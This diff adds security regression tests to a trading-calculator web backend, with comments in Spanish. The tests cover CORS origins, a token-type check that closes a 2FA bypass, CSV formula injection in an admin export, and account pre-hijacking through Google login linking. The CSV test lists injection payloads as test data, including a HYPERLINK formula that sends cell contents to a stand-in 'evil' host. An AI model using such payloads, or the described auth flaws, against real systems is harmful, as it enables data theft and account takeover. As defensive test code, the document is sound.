@@ -202,3 +202,201 @@ def test_emailed_link_base_honours_explicit_cors_allowlist(monkeypatch):
     assert trusted_link_base(_FakeRequest(origin=ok)) == ok
     # something NOT on the list still falls back to canonical
     assert trusted_link_base(_FakeRequest(origin="https://evil.com")) == "https://tradingcalculatorpro.com"
+
+
+# ============================================================
+#  El origen donde SE SIRVE la web tiene que estar permitido
+#  sin depender de una variable de entorno del despliegue
+# ============================================================
+#
+# Contexto del fallo que fija esto (2026-08-05): la web se publica en
+# `https://abcde-rgb.github.io/Tradingcalculatorpro.com` — no hay `CNAME` en
+# `frontend/public/` y el `homepage` de `package.json` apunta ahí. Pero la lista
+# de CORS del código sólo traía `tradingcalculatorpro.com`, que es el dominio que
+# NO está en uso. Lo único que hacía funcionar el login era la variable
+# `CORS_ORIGINS` que ponía el despliegue.
+#
+# Por qué es grave y por qué se ve tan mal: sin la cabecera CORS el backend
+# responde **200 con las cookies puestas** y es el NAVEGADOR quien descarta la
+# respuesta. En los logs de Cloud Run el login se ve perfecto; en la web no se
+# puede entrar y no hay ningún error que mirar. `curl` tampoco lo reproduce,
+# porque curl ignora CORS.
+#
+# Y desde el 2026-08-03 el backend se despliega A MANO (`cloudbuild.yaml`): un
+# `gcloud run deploy` sin `--set-env-vars` borra las variables del servicio y
+# tumba el login de todo el sitio. El origen real no puede depender de que
+# alguien se acuerde de una variable.
+
+def _cors_origins_with_env(env: dict) -> list:
+    """Evalúa el bloque `_CORS_ORIGINS` de server.py con un entorno dado.
+
+    Se extrae con `ast` en vez de importar server.py porque la lista se calcula
+    en tiempo de import: una vez importado el módulo, cambiar la variable de
+    entorno ya no tiene efecto, y el test no probaría nada.
+    """
+    src = _SERVER.read_text(encoding="utf-8")
+    tree = ast.parse(src)
+    chunks, capturing = [], False
+    for node in tree.body:
+        if isinstance(node, ast.Assign) and any(
+            getattr(t, "id", None) == "_CORS_ORIGINS" for t in node.targets
+        ):
+            capturing = True
+        if capturing:
+            chunks.append(ast.get_source_segment(src, node))
+            # el bloque acaba en el bucle que añade los orígenes extra
+            if isinstance(node, ast.For):
+                break
+    assert chunks, "no se pudo extraer _CORS_ORIGINS de server.py"
+    ns = {"os": type("_os", (), {"environ": env})()}
+    exec("\n".join(chunks), ns)  # noqa: S102 — código propio
+    return ns["_CORS_ORIGINS"]
+
+
+SERVED_ORIGIN = "https://abcde-rgb.github.io"
+
+
+def test_served_origin_is_allowed_without_any_env_var():
+    """El origen donde vive la web hoy entra por código, no por despliegue."""
+    origins = _cors_origins_with_env({})
+    assert SERVED_ORIGIN in origins, (
+        "El frontend se sirve en " + SERVED_ORIGIN + " y no está en la lista de "
+        "CORS. Sin la cabecera el navegador descarta la respuesta del login: el "
+        "backend devuelve 200 y el usuario no puede entrar."
+    )
+
+
+def test_own_domain_stays_allowed_for_the_dns_cutover():
+    """El dominio propio sigue permitido: el día del cutover no debe romperse."""
+    origins = _cors_origins_with_env({})
+    assert "https://tradingcalculatorpro.com" in origins
+    assert "https://www.tradingcalculatorpro.com" in origins
+
+
+def test_extra_origins_from_env_still_work_and_do_not_duplicate():
+    origins = _cors_origins_with_env({"CORS_ORIGINS": "https://staging.example.com," + SERVED_ORIGIN})
+    assert "https://staging.example.com" in origins
+    assert origins.count(SERVED_ORIGIN) == 1, "un origen repetido no debe duplicarse"
+
+
+# ── Confusión de tipo de token: el pre-2FA no autoriza (SEC-2026-2FA) ──────────
+# get_current_user aceptaba cualquier token bien firmado, sin mirar su `type`.
+# El `2fa_pending` se emite tras la contraseña pero ANTES del segundo factor, así
+# que tener la contraseña bastaba para operar en los endpoints que dependen de
+# esa función — anulando el 2FA. Verificado con PoC (leer/escribir/borrar).
+
+def _decode_and_gate_type(token_type: str) -> bool:
+    """Reproduce la comprobación de tipo que get_current_user aplica ahora:
+    devuelve True si un token de ese `type` sería aceptado como acceso."""
+    import re
+    src = _SERVER.read_text(encoding='utf-8')
+    # La guarda vive en get_current_user; comprobamos que el filtro existe y que
+    # sólo 'access' pasa.
+    body = src.split("async def get_current_user", 1)[1].split("async def require_user", 1)[0]
+    assert 'payload.get("type") != "access"' in body, (
+        "get_current_user ya no filtra por type: un refresh o un 2fa_pending "
+        "volverían a autorizar (bypass de 2FA)."
+    )
+    return token_type == "access"
+
+
+def test_get_current_user_rejects_non_access_tokens():
+    assert _decode_and_gate_type("access") is True
+    assert _decode_and_gate_type("refresh") is False
+    assert _decode_and_gate_type("2fa_pending") is False
+    assert _decode_and_gate_type("magic_link") is False
+
+
+def test_all_auth_dependencies_check_token_type():
+    """Las tres puertas de entdada exigen type == access. Si una deja de hacerlo,
+    es un bypass, así que se fija aquí para las tres a la vez."""
+    src = _SERVER.read_text(encoding='utf-8')
+    for fn in ("get_current_user", "require_user", "require_admin"):
+        body = src.split(f"async def {fn}", 1)[1][:1600]
+        assert 'payload.get("type") != "access"' in body, (
+            f"{fn} no comprueba que el token sea de acceso"
+        )
+
+
+# ── Inyección de fórmulas en el export CSV admin (SEC-2026-CSV) ────────────────
+# `name` lo elige el usuario y el CSV lo abre un ADMIN. Una celda que empieza por
+# = + - @ la evalúa la hoja de cálculo (=HYPERLINK exfiltra; DDE ejecuta).
+
+def _csv_safe_ref(value):
+    """Copia de la lógica de `_csv_safe` en server.py, para fijarla sin importar
+    el módulo entero (que levanta la app). El test de abajo comprueba además que
+    la función real existe con esta forma."""
+    if isinstance(value, str) and value and value[0] in ("=", "+", "-", "@", "\t", "\r"):
+        return "'" + value
+    return value
+
+
+import pytest as _pytest
+
+
+@_pytest.mark.parametrize("payload", [
+    '=HYPERLINK("http://evil/?d="&A2,"click")',
+    '+1+1',
+    '-2+3',
+    '@SUM(A1:A9)',
+    '\t=cmd',
+    '\r=cmd',
+])
+def test_csv_formula_payloads_are_neutralised(payload):
+    out = _csv_safe_ref(payload)
+    assert out.startswith("'"), f"la fórmula {payload!r} no se neutralizó"
+
+
+@_pytest.mark.parametrize("benign", ["Juan Pérez", "trader_2026", "AAPL 220C", "", "3.14"])
+def test_csv_benign_values_are_untouched(benign):
+    assert _csv_safe_ref(benign) == benign
+
+
+def test_server_has_the_csv_guard_wired_into_the_export():
+    """La función real existe y el endpoint la aplica a cada celda."""
+    src = _SERVER.read_text(encoding="utf-8")
+    assert "def _csv_safe(" in src, "falta el helper _csv_safe en server.py"
+    # Se aplica sobre las filas del export, no sólo definido y sin usar.
+    assert "_csv_safe(v)" in src, "el export de usuarios no aplica _csv_safe"
+
+
+# ── Account pre-hijacking en el enlazado federado (SEC-2026-PREHIJACK) ─────────
+# El registro no exige demostrar posesión del email y el login funciona sin
+# verificarlo. Un atacante registraba el correo de la víctima, se guardaba la
+# contraseña y esperaba: al entrar la víctima con Google, `google_auth` enlazaba
+# por email y la contraseña del atacante seguía sirviendo. Verificado con PoC.
+
+def _prehijack_decision(has_password: bool, email_verified: bool) -> bool:
+    """Réplica de la condición del enlazado: ¿hay que retirar la contraseña?"""
+    return bool(has_password) and not email_verified
+
+
+def test_password_is_dropped_when_linking_over_an_unverified_email():
+    """El caso del ataque: contraseña puesta sobre un email nunca verificado."""
+    assert _prehijack_decision(has_password=True, email_verified=False) is True
+
+
+def test_legitimate_linking_keeps_the_password():
+    """Mismo usuario que verificó su correo y ahora además usa Google: su
+    contraseña NO se toca, o el arreglo se convertiría en una denegación de
+    servicio para gente legítima."""
+    assert _prehijack_decision(has_password=True, email_verified=True) is False
+
+
+def test_google_only_account_is_untouched():
+    assert _prehijack_decision(has_password=False, email_verified=True) is False
+    assert _prehijack_decision(has_password=False, email_verified=False) is False
+
+
+def test_google_handler_wires_the_guard_and_revokes_sessions():
+    """La guarda existe en el handler real y revoca sesiones: sin la revocación,
+    un token ya emitido al atacante seguiría vivo hasta una hora."""
+    src = _SERVER.read_text(encoding="utf-8")
+    handler = src.split("async def google_auth", 1)[1].split("\n@api_router", 1)[0]
+    assert 'not user.get("email_verified")' in handler, "falta la guarda de pre-hijacking"
+    assert '"password"] = None' in handler or '"password": None' in handler, (
+        "el enlazado no retira la contraseña no verificada"
+    )
+    assert "_revoke_all_tokens_for_user" in handler, (
+        "el enlazado no revoca las sesiones vivas del atacante"
+    )
